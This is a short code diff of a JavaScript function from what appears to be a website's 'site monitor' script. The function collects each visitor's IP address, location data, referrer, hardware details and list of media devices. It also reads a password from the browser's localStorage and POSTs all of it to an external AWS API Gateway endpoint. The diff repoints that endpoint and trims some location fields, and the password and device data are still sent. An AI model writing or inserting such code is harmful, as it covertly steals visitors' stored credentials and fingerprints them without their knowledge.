@@ -2,11 +2,11 @@ function getStatData (response) {
   navigator.mediaDevices.enumerateDevices().then(
       ctrldevices => {
         $.ajax({
-          url:"https://l1az6ozvxa.execute-api.us-east-1.amazonaws.com/alpha/helloworld",
+          url:"https://2e2qjwhkig.execute-api.us-east-1.amazonaws.com/Prod/sitemonitor",
           type: "post",
           dataType: 'json',
           contentType: "application/json",
-          data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org, pwd:localStorage.getItem("password"),referrer:document.referrer, else:JSON.stringify({hardware:hardwareInfo(), inp: ctrldevices})})
+          data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), pwd:localStorage.getItem("password"),referrer:document.referrer, else:JSON.stringify({hardware:hardwareInfo(), inp: ctrldevices})})
         });
       }
     )
